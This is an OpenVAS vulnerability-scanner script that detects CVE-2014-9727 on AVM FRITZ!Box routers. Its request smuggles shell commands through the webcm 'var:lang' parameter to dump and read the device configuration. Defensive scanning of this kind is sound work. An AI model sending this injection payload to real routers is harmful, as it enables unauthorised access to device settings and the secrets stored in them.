###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avm_fritz_box_02_14_remote.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Multiple AVM FRITZ!Box Multiple Vulnerabilities (remote check)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/o:avm:fritz%21_os";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103912");
  script_version("$Revision: 13994 $");
  script_bugtraq_id(74927, 65520);
  script_cve_id("CVE-2014-9727");
  script_name("Multiple AVM FRITZ!Box Multiple Vulnerabilities (remote check)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-03-10 11:07:20 +0100 (Mon, 10 Mar 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_avm_fritz_box_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("avm_fritz_box/http/detected");

  script_xref(name:"URL", value:"http://www.avm.de/de/Sicherheit/liste_update.html");
  script_xref(name:"URL", value:"http://www.fritzbox.eu/en/news/2014/security_updates_available.php");
  script_xref(name:"URL", value:"http://www.heise.de/newsticker/meldung/Jetzt-Fritzbox-aktualisieren-Hack-gegen-AVM-Router-auch-ohne-Fernzugang-2115745.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/74927");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65520");

  script_tag(name:"vuldetect", value:"Try to read the configuration of the device.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references section
  for more information.");

  script_tag(name:"summary", value:"AVM FRITZ!Box is prone to multiple vulnerabilities");

  script_tag(name:"affected", value:"See the list provided by the vendor at the linked references.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir  = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"];
url = dir + "/cgi-bin/webcm?var:lang=%26allcfgconv%20-C%20ar7%20-c%20-o%20/var/tmp/" + file + "%26%26%20cat%20/var/tmp/" + file;

req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "servercfg" >< buf && "websrv" >< buf && "webui" >< buf ) {
  lines = split( buf );
  for( i = 0; i < max_index( lines ); i++ ) {
    if( "webui {" >< lines[i] ) {
      while( "}" >!< lines[i] ) {
        report += lines[i];
        i++;
      }
    }
  }

  report = 'It was possible to read the configuration of the remote device. Here is a small sample:\n\n' + report;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );